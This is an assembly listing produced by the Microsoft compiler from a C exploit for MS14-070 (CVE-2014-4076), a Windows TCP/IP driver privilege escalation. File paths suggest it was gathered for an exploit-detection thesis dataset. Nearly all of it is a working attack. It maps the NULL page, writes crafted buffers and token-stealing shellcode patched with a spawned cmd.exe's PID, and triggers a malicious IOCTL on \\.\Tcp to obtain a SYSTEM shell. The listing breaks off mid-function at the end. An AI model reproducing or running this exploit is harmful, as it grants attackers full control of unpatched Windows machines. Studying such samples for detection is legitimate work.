; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_37755_cve_id_CVE-2014-4076.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

_DATA	SEGMENT
COMM	_ZwAllocateVirtualMemory:DWORD
COMM	_ZwDeviceIoControlFile:DWORD
_DATA	ENDS
PUBLIC	___local_stdio_printf_options
PUBLIC	__vfprintf_l
PUBLIC	_fprintf
PUBLIC	_printf
PUBLIC	__vsnprintf_l
PUBLIC	__vsprintf_l
PUBLIC	_sprintf
PUBLIC	_CreateNewCmdProcess@8
PUBLIC	_SwapBytes
PUBLIC	_WriteToAllocMem
PUBLIC	_main
EXTRN	_memset:PROC
EXTRN	__imp__CreateFileA@28:PROC
EXTRN	__imp__CloseHandle@4:PROC
EXTRN	__imp__GetLastError@0:PROC
EXTRN	__imp__WaitForSingleObject@8:PROC
EXTRN	__imp__ExitProcess@4:PROC
EXTRN	__imp__CreateProcessA@40:PROC
EXTRN	__imp__WriteProcessMemory@20:PROC
EXTRN	__imp__GetModuleHandleA@4:PROC
EXTRN	__imp__GetProcAddress@8:PROC
EXTRN	_malloc:PROC
EXTRN	_strtol:PROC
EXTRN	___acrt_iob_func:PROC
EXTRN	_fflush:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	___stdio_common_vsprintf:PROC
EXTRN	@__security_check_cookie@4:PROC
EXTRN	___security_cookie:DWORD
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_BSS	SEGMENT
$SG98229 DB	03H DUP (?)
	ALIGN	4

$SG98230 DB	03H DUP (?)
_BSS	ENDS
_DATA	SEGMENT
$SG98197 DB	'c:\windows\system32\cmd.exe /K cd c:\windows\system32', 00H
	ORG $+2
$SG98228 DB	087H, 0ffH, 0ffH, '8', 00H
	ORG $+3
$SG98283 DB	'[*] MS14-070 (CVE-2014-4076) x86', 0aH, 00H
	ORG $+2
$SG98284 DB	'    [*] by Tomislav Paskalev', 0aH, 00H
	ORG $+2
$SG98286 DB	'[-] Creating a new process failed', 0aH, 00H
	ORG $+1
$SG98287 DB	'    [*] Error code   : %d', 0aH, 00H
	ORG $+1
$SG98288 DB	'[+] Created a new cmd.exe process', 0aH, 00H
	ORG $+1
$SG98289 DB	'    [*] PID [dec]    :   %#8lu', 0aH, 00H
$SG98290 DB	'    [*] PID [hex]    : %#010x', 0aH, 00H
	ORG $+1
$SG98291 DB	'    [*] PID [hex LE] : %#010x', 0aH, 00H
	ORG $+1
$SG98292 DB	'%04x', 00H
	ORG $+3
$SG98293 DB	00H, 04H, 00H, 00H, 00H, 00H, 00H, 00H, 00H, 02H, 00H, 00H
	DB	00H, 02H, 00H, 00H, '"', 00H, 00H, 00H, 04H, 00H, 00H, 00H, 00H
	DB	00H, 01H, 00H, 00H, 00H, 00H, 00H, 00H
	ORG $+3
$SG98295 DB	'39', 00H
	ORG $+1
$SG98294 DB	'`d', 0a1H, '$', 01H, 00H, 00H, 08bH, '@8P', 0bbH, 04H, 00H
	DB	00H, 00H, 08bH, 080H, 098H, 00H, 00H, 00H, '-', 098H, 00H, 00H
	DB	00H, '9', 098H, 094H, 00H, 00H, 00H, 'u', 0edH, 08bH, 0b8H, 0d8H
	DB	00H, 00H, 00H, 083H, 0e7H, 0f8H, 'X', 0bbH, 'AAAA', 08bH, 080H
	DB	098H, 00H, 00H, 00H, '-', 098H, 00H, 00H, 00H, '9', 098H, 094H
	DB	00H, 00H, 00H, 'u', 0edH, 089H, 0b8H, 0d8H, 00H, 00H, 00H, 'a', 0baH
	DB	011H, 011H, 011H, 011H, 0b9H, '""""', 0b8H, ';', 00H, 00H, 00H
	DB	08eH, 0e0H, 0fH, '5', 00H, 00H
	ORG $+3
$SG98296 DB	'ff', 00H
	ORG $+1
$SG98297 DB	'a2', 00H
	ORG $+1
$SG98298 DB	'ba', 00H
	ORG $+1
$SG98299 DB	'0', 00H
	ORG $+2
$SG98300 DB	'0', 00H
	ORG $+2
$SG98301 DB	'0', 00H
	ORG $+2
$SG98302 DB	'0', 00H
	ORG $+2
$SG98303 DB	'[+] Modified shellcode', 0aH, 00H
$SG98304 DB	'\\.\Tcp', 00H
$SG98306 DB	'[-] Opening TCP/IP I/O dev failed', 0aH, 00H
	ORG $+1
$SG98307 DB	'    [*] Error code   : %d', 0aH, 00H
	ORG $+1
$SG98308 DB	'[+] Opened TCP/IP I/O device', 0aH, 00H
	ORG $+2
$SG98309 DB	'ZwAllocateVirtualMemory', 00H
$SG98310 DB	'NTDLL.DLL', 00H
	ORG $+2
$SG98311 DB	'[*] ntdll.dll address: 0x%p', 0aH, 00H
	ORG $+3
$SG98313 DB	'[-] Allocating memory failed', 0aH, 00H
	ORG $+2
$SG98314 DB	'    [*] Error code   : %#X', 0aH, 00H
$SG98315 DB	'[+] Allocated memory', 0aH, 00H
	ORG $+2
$SG98316 DB	'    [*] BaseAddress  : 0x%p', 0aH, 00H
	ORG $+3
$SG98317 DB	'    [*] RegionSize   : %#010x', 0aH, 00H
	ORG $+1
$SG98318 DB	'[*] Writing exploit...', 0aH, 00H
$SG98321 DB	'    [-] Failed to write to memory', 0aH, 00H
	ORG $+1
$SG98322 DB	'        [*] Err code : %d', 0aH, 00H
	ORG $+1
$SG98323 DB	'    [+] done', 0aH, 00H
	ORG $+2
$SG98324 DB	'[*] Spawning SYSTEM shell...', 0aH, 00H
	ORG $+2
$SG98325 DB	'    [*] Parent proc hangs on exit', 0aH, 00H
	ORG $+1
$SG98326 DB	'ZwDeviceIoControlFile', 00H
	ORG $+2
$SG98327 DB	'NTDLL.DLL', 00H
	ORG $+2
$SG98329 DB	'    [-] Exploit failed (->TCP/IP)', 0aH, 00H
	ORG $+1
$SG98330 DB	'        [*] Err code : %d', 0aH, 00H
	ORG $+1
$SG98331 DB	'[*] Exiting SYSTEM shell...', 0aH, 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_DevIoCtrlReturnCode$ = -204				; size = 4
_ZwDeviceIoControlFile$ = -200				; size = 4
_ioStatus$ = -196					; size = 4
_startupInformation$ = -192				; size = 4
_RegionSize$ = -188					; size = 4
_BaseAddress$ = -184					; size = 4
_AllocMemReturnCode$ = -180				; size = 4
_ZwAllocateVirtualMemory$ = -176			; size = 4
_pidLittleEndian$ = -172				; size = 4
_tcpIPDeviceHandle$ = -168				; size = 4
_buffer$1 = -164					; size = 3
_counter$ = -160					; size = 4
_processInformation$ = -156				; size = 4
_exploitBuffer$ = -152					; size = 33
_shellcode$ = -116					; size = 97
_pidLittleEndianString$ = -16				; size = 9
__$ArrayPad$ = -4					; size = 4
_main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_37755_cve_id_CVE-2014-4076.c
; Line 210
	push	ebp
	mov	ebp, esp
	sub	esp, 204				; 000000ccH
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	mov	DWORD PTR __$ArrayPad$[ebp], eax
	push	esi
	push	edi
; Line 211
	push	OFFSET $SG98283
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 212
	push	OFFSET $SG98284
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 213
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 220
	push	68					; 00000044H
	call	_malloc
	add	esp, 4
	mov	DWORD PTR _startupInformation$[ebp], eax
; Line 221
	push	16					; 00000010H
	call	_malloc
	add	esp, 4
	mov	DWORD PTR _processInformation$[ebp], eax
; Line 223
	mov	eax, 16					; 00000010H
	imul	ecx, eax, 0
	add	ecx, DWORD PTR _processInformation$[ebp]
	push	ecx
	mov	edx, 68					; 00000044H
	imul	eax, edx, 0
	add	eax, DWORD PTR _startupInformation$[ebp]
	push	eax
	call	_CreateNewCmdProcess@8
	test	eax, eax
	jne	SHORT $LN5@main
; Line 225
	push	OFFSET $SG98286
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 226
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG98287
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 227
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 228
	push	1
	call	DWORD PTR __imp__ExitProcess@4
$LN5@main:
; Line 231
	push	OFFSET $SG98288
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 232
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 239
	mov	ecx, DWORD PTR _processInformation$[ebp]
	mov	edx, DWORD PTR [ecx+8]
	push	edx
	call	_SwapBytes
	add	esp, 4
	mov	DWORD PTR _pidLittleEndian$[ebp], eax
; Line 240
	mov	eax, DWORD PTR _processInformation$[ebp]
	mov	ecx, DWORD PTR [eax+8]
	push	ecx
	push	OFFSET $SG98289
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 241
	mov	edx, DWORD PTR _processInformation$[ebp]
	mov	eax, DWORD PTR [edx+8]
	push	eax
	push	OFFSET $SG98290
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 242
	mov	ecx, DWORD PTR _pidLittleEndian$[ebp]
	push	ecx
	push	OFFSET $SG98291
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 247
	mov	edx, DWORD PTR _pidLittleEndian$[ebp]
	push	edx
	push	OFFSET $SG98292
	mov	eax, 1
	imul	ecx, eax, 0
	lea	edx, DWORD PTR _pidLittleEndianString$[ebp+ecx]
	push	edx
	call	_sprintf
	add	esp, 12					; 0000000cH
; Line 254
	mov	ecx, 8
	mov	esi, OFFSET $SG98293
	lea	edi, DWORD PTR _exploitBuffer$[ebp]
	rep movsd
	movsb
; Line 257
	mov	ecx, 24					; 00000018H
	mov	esi, OFFSET $SG98294
	lea	edi, DWORD PTR _shellcode$[ebp]
	rep movsd
	movsb
; Line 266
	mov	DWORD PTR _counter$[ebp], 0
	jmp	SHORT $LN4@main
$LN2@main:
	mov	eax, DWORD PTR _counter$[ebp]
	add	eax, 1
	mov	DWORD PTR _counter$[ebp], eax
$LN4@main:
	cmp	DWORD PTR _counter$[ebp], 4
	jge	SHORT $LN3@main
; Line 268
	mov	ecx, DWORD PTR _counter$[ebp]
	mov	dl, BYTE PTR _pidLittleEndianString$[ebp+ecx*2]
	mov	BYTE PTR _buffer$1[ebp], dl
	mov	eax, DWORD PTR _counter$[ebp]
	mov	cl, BYTE PTR _pidLittleEndianString$[ebp+eax*2+1]
	mov	BYTE PTR _buffer$1[ebp+1], cl
	mov	BYTE PTR _buffer$1[ebp+2], 0
; Line 269
	push	16					; 00000010H
	push	0
	lea	edx, DWORD PTR _buffer$1[ebp]
	push	edx
	call	_strtol
	add	esp, 12					; 0000000cH
	mov	ecx, DWORD PTR _counter$[ebp]
	mov	BYTE PTR _shellcode$[ebp+ecx+46], al
; Line 270
	jmp	SHORT $LN2@main
$LN3@main:
; Line 272
	push	16					; 00000010H
	push	0
	push	OFFSET $SG98295
	call	_strtol
	add	esp, 12					; 0000000cH
	mov	edx, 1
	imul	ecx, edx, 77
	mov	BYTE PTR _shellcode$[ebp+ecx], al
; Line 273
	push	16					; 00000010H
	push	0
	push	OFFSET $SG98296
	call	_strtol
	add	esp, 12					; 0000000cH
	mov	edx, 1
	imul	ecx, edx, 78
	mov	BYTE PTR _shellcode$[ebp+ecx], al
; Line 274
	push	16					; 00000010H
	push	0
	push	OFFSET $SG98297
	call	_strtol
	add	esp, 12					; 0000000cH
	mov	edx, 1
	imul	ecx, edx, 79
	mov	BYTE PTR _shellcode$[ebp+ecx], al
; Line 275
	push	16					; 00000010H
	push	0
	push	OFFSET $SG98298
	call	_strtol
	add	esp, 12					; 0000000cH
	mov	edx, 1
	imul	ecx, edx, 80
	mov	BYTE PTR _shellcode$[ebp+ecx], al
; Line 277
	push	16					; 00000010H
	push	0
	push	OFFSET $SG98299
	call	_strtol
	add	esp, 12					; 0000000cH
	mov	edx, 1
	imul	ecx, edx, 82
	mov	BYTE PTR _shellcode$[ebp+ecx], al
; Line 278
	push	16					; 00000010H
	push	0
	push	OFFSET $SG98300
	call	_strtol
	add	esp, 12					; 0000000cH
	mov	edx, 1
	imul	ecx, edx, 83
	mov	BYTE PTR _shellcode$[ebp+ecx], al
; Line 279
	push	16					; 00000010H
	push	0
	push	OFFSET $SG98301
	call	_strtol
	add	esp, 12					; 0000000cH
	mov	edx, 1
	imul	ecx, edx, 84
	mov	BYTE PTR _shellcode$[ebp+ecx], al
; Line 280
	push	16					; 00000010H
	push	0
	push	OFFSET $SG98302
	call	_strtol
	add	esp, 12					; 0000000cH
	mov	edx, 1
	imul	ecx, edx, 85
	mov	BYTE PTR _shellcode$[ebp+ecx], al
; Line 282
	push	OFFSET $SG98303
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 283
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 290
	push	0
	push	0
	push	3
	push	0
	push	0
	push	0
	push	OFFSET $SG98304
	call	DWORD PTR __imp__CreateFileA@28
	mov	DWORD PTR _tcpIPDeviceHandle$[ebp], eax
; Line 300
	cmp	DWORD PTR _tcpIPDeviceHandle$[ebp], -1
	jne	SHORT $LN6@main
; Line 302
	push	OFFSET $SG98306
	call	_printf
	add	esp, 4
; Line 303
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG98307
	call	_printf
	add	esp, 8
; Line 304
	push	1
	call	DWORD PTR __imp__ExitProcess@4
$LN6@main:
; Line 307
	push	OFFSET $SG98308
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 308
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 317
	push	OFFSET $SG98309
	push	OFFSET $SG98310
	call	DWORD PTR __imp__GetModuleHandleA@4
	push	eax
	call	DWORD PTR __imp__GetProcAddress@8
	mov	DWORD PTR _ZwAllocateVirtualMemory$[ebp], eax
; Line 319
	mov	edx, DWORD PTR _ZwAllocateVirtualMemory$[ebp]
	push	edx
	push	OFFSET $SG98311
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 320
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 323
	mov	DWORD PTR _BaseAddress$[ebp], 4096	; 00001000H
	mov	DWORD PTR _RegionSize$[ebp], 16384	; 00004000H
; Line 325
	push	64					; 00000040H
	push	12288					; 00003000H
	lea	eax, DWORD PTR _RegionSize$[ebp]
	push	eax
	push	0
	lea	ecx, DWORD PTR _BaseAddress$[ebp]
	push	ecx
	push	-1
	call	DWORD PTR _ZwAllocateVirtualMemory$[ebp]
	mov	DWORD PTR _AllocMemReturnCode$[ebp], eax
; Line 334
	cmp	DWORD PTR _AllocMemReturnCode$[ebp], 0
	je	SHORT $LN7@main
; Line 336
	push	OFFSET $SG98313
	call	_printf
	add	esp, 4
; Line 337
	mov	edx, DWORD PTR _AllocMemReturnCode$[ebp]
	push	edx
	push	OFFSET $SG98314
	call	_printf
	add	esp, 8
; Line 338
	push	1
	call	DWORD PTR __imp__ExitProcess@4
$LN7@main:
; Line 341
	push	OFFSET $SG98315
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 342
	mov	eax, DWORD PTR _BaseAddress$[ebp]
	push	eax
	push	OFFSET $SG98316
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 343
	mov	ecx, DWORD PTR _RegionSize$[ebp]
	push	ecx
	push	OFFSET $SG98317
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 344
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 351
	push	OFFSET $SG98318
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 352
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 354
	mov	edx, 1
	imul	eax, edx, 0
	lea	ecx, DWORD PTR _shellcode$[ebp+eax]
	push	ecx
	mov	edx, 1
	imul	eax, edx, 0
	lea	ecx, DWORD PTR _exploitBuffer$[ebp+eax]
	push	ecx
	call	_WriteToAllocMem
	add	esp, 8
	test	eax, eax
	jne	SHORT $LN8@main
; Line 356
	push	OFFSET $SG98321
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 357
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG98322
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 358
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 359
	push	1
	call	DWORD PTR __imp__ExitProcess@4
; Line 360
	jmp	SHORT $LN9@main
$LN8@main:
; Line 363
	push	OFFSET $SG98323
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 364
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
$LN9@main:
; Line 372
	push	OFFSET $SG98324
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 373
	push	OFFSET $SG98325
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 374
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 378
	mov	DWORD PTR _ioStatus$[ebp], 8
; Line 380
	push	OFFSET $SG98326
	push	OFFSET $SG98327
	call	DWORD PTR __imp__GetModuleHandleA@4
	push	eax
	call	DWORD PTR __imp__GetProcAddress@8
	mov	DWORD PTR _ZwDeviceIoControlFile$[ebp], eax
; Line 382
	push	0
	push	0
	push	32					; 00000020H
	push	4352					; 00001100H
	push	1179688					; 00120028H
	lea	edx, DWORD PTR _ioStatus$[ebp]
	push	edx
	push	0
	push	0
	push	0
	mov	eax, DWORD PTR _tcpIPDeviceHandle$[ebp]
	push	eax
	call	DWORD PTR _ZwDeviceIoControlFile$[ebp]
	mov	DWORD PTR _DevIoCtrlReturnCode$[ebp], eax
; Line 398
	cmp	DWORD PTR _DevIoCtrlReturnCode$[ebp], 0
	je	SHORT $LN10@main
; Line 400
	push	OFFSET $SG98329
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 401
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG98330
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 12					; 0000000cH
; Line 402
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 403
	push	1
	call	DWORD PTR __imp__ExitProcess@4
$LN10@main:
; Line 412
	push	-1
	mov	ecx, DWORD PTR _processInformation$[ebp]
	mov	edx, DWORD PTR [ecx]
	push	edx
	call	DWORD PTR __imp__WaitForSingleObject@8
; Line 414
	push	OFFSET $SG98331
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 415
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 418
	mov	eax, DWORD PTR _tcpIPDeviceHandle$[ebp]
	push	eax
	call	DWORD PTR __imp__CloseHandle@4
; Line 419
	mov	ecx, DWORD PTR _processInformation$[ebp]
	mov	edx, DWORD PTR [ecx]
	push	edx
	call	DWORD PTR __imp__CloseHandle@4
; Line 420
	mov	eax, DWORD PTR _processInformation$[ebp]
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	call	DWORD PTR __imp__CloseHandle@4
; Line 422
	mov	eax, 1
$LN11@main:
; Line 423
	pop	edi
	pop	esi
	mov	ecx, DWORD PTR __$ArrayPad$[ebp]
	xor	ecx, ebp
	call	@__security_check_cookie@4
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_returnAllocMemValue5$ = -20				; size = 4
_returnAllocMemValue4$ = -16				; size = 4
_returnAllocMemValue3$ = -12				; size = 4
_returnAllocMemValue2$ = -8				; size = 4
_returnAllocMemValue1$ = -4				; size = 4
_exploitBuffer$ = 8					; size = 4
_shellcode$ = 12					; size = 4
_WriteToAllocMem PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_37755_cve_id_CVE-2014-4076.c
; Line 157
	push	ebp
	mov	ebp, esp
	sub	esp, 20					; 00000014H
; Line 160
	push	0
	push	4
	push	OFFSET $SG98228
	push	40					; 00000028H
	push	-1
	call	DWORD PTR __imp__WriteProcessMemory@20
	mov	DWORD PTR _returnAllocMemValue1$[ebp], eax
; Line 167
	push	0
	push	2
	push	OFFSET $SG98229
	push	56					; 00000038H
	push	-1
	call	DWORD PTR __imp__WriteProcessMemory@20
	mov	DWORD PTR _returnAllocMemValue2$[ebp], eax
; Line 174
	push	0
	push	32					; 00000020H
	mov	eax, 1
	imul	ecx, eax, 0
	add	ecx, DWORD PTR _exploitBuffer$[ebp]
	push	ecx
	push	4352					; 00001100H
	push	-1
	call	DWORD PTR __imp__WriteProcessMemory@20
	mov	DWORD PTR _returnAllocMemValue3$[ebp], eax
; Line 181
	push	0
	push	2
	push	OFFSET $SG98230
	push	43					; 0000002bH
	push	-1
	call	DWORD PTR __imp__WriteProcessMemory@20
	mov	DWORD PTR _returnAllocMemValue4$[ebp], eax
; Line 188
	push	0
	push	96					; 00000060H
	mov	edx, 1
	imul	eax, edx, 0
	add	eax, DWORD PTR _shellcode$[ebp]
	push	eax
	push	8192					; 00002000H
	push	-1
	call	DWORD PTR __imp__WriteProcessMemory@20
	mov	DWORD PTR _returnAllocMemValue5$[ebp], eax
; Line 199
	cmp	DWORD PTR _returnAllocMemValue1$[ebp], 0
	je	SHORT $LN4@WriteToAll
	cmp	DWORD PTR _returnAllocMemValue2$[ebp], 0
	je	SHORT $LN4@WriteToAll
	cmp	DWORD PTR _returnAllocMemValue3$[ebp], 0
	je	SHORT $LN4@WriteToAll
	cmp	DWORD PTR _returnAllocMemValue4$[ebp], 0
	je	SHORT $LN4@WriteToAll
	cmp	DWORD PTR _returnAllocMemValue5$[ebp], 0
	jne	SHORT $LN2@WriteToAll
$LN4@WriteToAll:
; Line 201
	xor	eax, eax
	jmp	SHORT $LN1@WriteToAll
	jmp	SHORT $LN1@WriteToAll
$LN2@WriteToAll:
; Line 203
	mov	eax, 1
$LN1@WriteToAll:
; Line 204
	mov	esp, ebp
	pop	ebp
	ret	0
_WriteToAllocMem ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_inputByteUL$ = 8					; size = 4
_SwapBytes PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_37755_cve_id_CVE-2014-4076.c
; Line 148
	push	ebp
	mov	ebp, esp
; Line 149
	mov	eax, DWORD PTR _inputByteUL$[ebp]
	and	eax, 255				; 000000ffH
	shl	eax, 24					; 00000018H
	mov	ecx, DWORD PTR _inputByteUL$[ebp]
	and	ecx, 65280				; 0000ff00H
	shl	ecx, 8
	add	eax, ecx
	mov	edx, DWORD PTR _inputByteUL$[ebp]
	and	edx, 16711680				; 00ff0000H
	shr	edx, 8
	add	eax, edx
	mov	ecx, DWORD PTR _inputByteUL$[ebp]
	and	ecx, -16777216				; ff000000H
	shr	ecx, 24					; 00000018H
	add	eax, ecx
; Line 151
	pop	ebp
	ret	0
_SwapBytes ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_startupInformation$ = 8				; size = 4
_processInformation$ = 12				; size = 4
_CreateNewCmdProcess@8 PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_37755_cve_id_CVE-2014-4076.c
; Line 124
	push	ebp
	mov	ebp, esp
; Line 125
	push	68					; 00000044H
	push	0
	mov	eax, 68					; 00000044H
	imul	ecx, eax, 0
	add	ecx, DWORD PTR _startupInformation$[ebp]
	push	ecx
	call	_memset
	add	esp, 12					; 0000000cH
; Line 126
	mov	edx, DWORD PTR _startupInformation$[ebp]
	mov	DWORD PTR [edx], 68			; 00000044H
; Line 127
	push	16					; 00000010H
	push	0
	mov	eax, 16					; 00000010H
	imul	ecx, eax, 0
	add	ecx, DWORD PTR _processInformation$[ebp]
	push	ecx
	call	_memset
	add	esp, 12					; 0000000cH
; Line 130
	mov	edx, 16					; 00000010H
	imul	eax, edx, 0
	add	eax, DWORD PTR _processInformation$[ebp]
	push	eax
	mov	ecx, 68					; 00000044H
	imul	edx, ecx, 0
	add	edx, DWORD PTR _startupInformation$[ebp]
	push	edx
	push	0
	push	0
	push	0
	push	1
	push	0
	push	0
	push	OFFSET $SG98197
	push	0
	call	DWORD PTR __imp__CreateProcessA@40
; Line 142
	pop	ebp
	ret	8
_CreateNewCmdProcess@8 ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _sprintf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Buffer$ = 8						; size = 4
__Format$ = 12						; size = 4
_sprintf PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1771
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 1774
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 1776
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Buffer$[ebp]
	push	eax
	call	__vsprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 1778
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 1779
	mov	eax, DWORD PTR __Result$[ebp]
; Line 1780
	mov	esp, ebp
	pop	ebp
	ret	0
_sprintf ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vsprintf_l
_TEXT	SEGMENT
__Buffer$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vsprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1458
	push	ebp
	mov	ebp, esp
; Line 1459
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	-1
	mov	eax, DWORD PTR __Buffer$[ebp]
	push	eax
	call	__vsnprintf_l
	add	esp, 20					; 00000014H
; Line 1460
	pop	ebp
	ret	0
__vsprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vsnprintf_l
_TEXT	SEGMENT
tv74 = -8						; size = 4
__Result$ = -4						; size = 4
__Buffer$ = 8						; size = 4
__BufferCount$ = 12					; size = 4
__Format$ = 16						; size = 4
__Locale$ = 20						; size = 4
__ArgList$ = 24						; size = 4
__vsnprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1391
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 1392
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __BufferCount$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Buffer$[ebp]
	push	ecx
	call	___local_stdio_printf_options
	mov	edx, DWORD PTR [eax]
	or	edx, 1
	mov	eax, DWORD PTR [eax+4]
	push	eax
	push	edx
	call	___stdio_common_vsprintf
	add	esp, 28					; 0000001cH
	mov	DWORD PTR __Result$[ebp], eax
; Line 1396
	cmp	DWORD PTR __Result$[ebp], 0
	jge	SHORT $LN3@vsnprintf_
	mov	DWORD PTR tv74[ebp], -1
	jmp	SHORT $LN4@vsnprintf_
$LN3@vsnprintf_:
	mov	ecx, DWORD PTR __Result$[ebp]
